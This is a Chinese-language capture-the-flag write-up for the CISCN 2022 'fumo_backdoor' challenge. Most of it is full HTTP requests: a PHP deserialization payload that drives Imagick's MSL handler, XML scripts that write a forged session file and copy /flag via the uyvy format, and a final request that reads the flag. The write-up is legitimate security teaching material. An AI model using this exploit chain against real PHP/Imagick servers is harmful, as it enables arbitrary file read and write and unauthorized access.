---
tags: [PHP反序列化, Imagick利用, MSL, uyvy格式绕过, 任意文件读取, RCE]
---

# fumo_backdoor

[https://github.com/AFKL-CUIT/CTF-Challenges/blob/master/CISCN/2022/backdoor/writup/writup.md](https://_github.com_afkl-cuit_ctf-challenges_blob_master_ciscn_2022_backdoor_writup_writup/)

这道题需要用 new a(a(b) imagick 的 read/write把flag读出来写到/tmp/里，然后利用上面的技巧触发serialize→**_sleep,** **读出****tmp****里的****flag**

_难点在于让flag通过图片校验 翻了下这份文档

**[**[**https://github.com/ImageMagick/Image****Magick/blob/main/www/formats.html**](https://github.com/ImageMagick/ImageMagick/blob/main/www/formats.html)**]** **(**[**https:**github.com_imagemagick_imagemagick_blob_main_www_formats](https:github.com_imagemagick_imagemagick_blob_main_www_formats))

uyvy格式的检查较为宽松

***\*exp\****

删除

```
GET /?cmd=rm HTTP/1.1
Host: 192.168.3.32:18080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like
Gecko) Chrome/114.0.0.0 Safari/537.36
Cookie: PHPSESSID=RABBIT
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

写入session

```
POST /?
cmd=unserialze&data=O%3a13%3a%22fumo_backdoor%22%3a3%3a%7bs%3a4%3a%22path%22%3bN%3bs%3a
4%3a%22argv%22%3bs%3a17%3a%22vid%3amsl%3a%2ftmp%2fphp*%22%3bs%3a5%3a%22class%22%3bs%3a7
%3a%22Imagick%22%3b%7d HTTP/1.1
Host: 192.168.3.32:18080
User-Agent: curl/7.88.1
Accept: */*
Content-Length: 697
Content-Type: multipart/form-data; boundary=------------------------b2fa911beb0df7b1
Connection: close

--------------------------b2fa911beb0df7b1
Content-Disposition: form-data; name="aa"; filename="aa"
Content-Type: application/octet-stream

<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="inline:data://image/x-portable-
anymap;base64,UDYKOSA5CjI1NQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHJ1YmJpc2hoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGh
oaGhoaGhoaGhoaHxPOjEzOiJmdW1vX2JhY2tkb29yIjoxOntzOjQ6InBhdGgiO3M6MTM6Ii90bXAvMjMzM2hoaG
giO30="/>
<write filename="/tmp/sess_RABBIT"/>
</image>

--------------------------b2fa911beb0df7b1--
```

复制flag

```
POST /?
cmd=unserialze&data=O%3a13%3a%22fumo_backdoor%22%3a3%3a%7bs%3a4%3a%22path%22%3bN%3bs%3a
4%3a%22argv%22%3bs%3a17%3a%22vid%3amsl%3a%2ftmp%2fphp*%22%3bs%3a5%3a%22class%22%3bs%3a7
%3a%22Imagick%22%3b%7d HTTP/1.1
Host: 192.168.3.32:18080
User-Agent: curl/7.88.1
Accept: */*
Content-Length: 319
Content-Type: multipart/form-data; boundary=------------------------b2fa911beb0df7b1
Connection: close

--------------------------b2fa911beb0df7b1
Content-Disposition: form-data; name="aa"; filename="aa"
Content-Type: application/octet-stream

<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="uyvy:/flag"/>
<write filename="/tmp/2333hhhh"/>
</image>

--------------------------b2fa911beb0df7b1--
```

反序列化读flag

```
GET /?
cmd=unserialze&data=O%3a13%3a%22fumo_backdoor%22%3a4%3a%7bs%3a4%3a%22path%22%3bN%3bs%3a
4%3a%22argv%22%3bN%3bs%3a4%3a%22func%22%3bs%3a13%3a%22session_start%22%3bs%3a5%3a%22cla
ss%22%3bN%3b%7d HTTP/1.1
Host: 192.168.3.32:18080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like
Gecko) Chrome/114.0.0.0 Safari/537.36
Cookie: PHPSESSID=RABBIT
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

